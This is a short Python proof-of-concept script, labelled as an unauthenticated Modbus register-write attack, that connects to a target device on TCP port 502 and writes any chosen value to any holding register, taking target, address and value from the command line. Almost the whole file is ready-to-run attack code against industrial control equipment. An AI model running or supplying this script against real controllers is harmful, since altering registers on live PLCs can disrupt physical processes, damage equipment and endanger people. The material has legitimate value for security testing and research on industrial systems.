"""
Modbus PoC: Unauthenticated register write.
Usage: python poc/write_register.py <target_ip> <addr> <value> [port]
"""
import socket, struct, sys
MBAP = struct.Struct(">HHHB")

def write_reg(host, addr, value, port=502):
    pdu = struct.pack(">BHH", 6, addr, value)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5); sock.connect((host, port))
    sock.sendall(MBAP.pack(1, 0, len(pdu) + 1, 1) + pdu)
    resp = sock.recv(1024)
    if resp and not (resp[7] & 0x80):
        print(f"[+] Register {addr} = {value}")
    else:
        print(f"[!] Write failed: 0x{resp[8]:02X}" if len(resp) > 8 else "[!] No response")
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 4: print("Usage: python write_register.py <target> <addr> <value> [port]"); sys.exit(1)
    write_reg(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4]) if len(sys.argv) > 4 else 502)
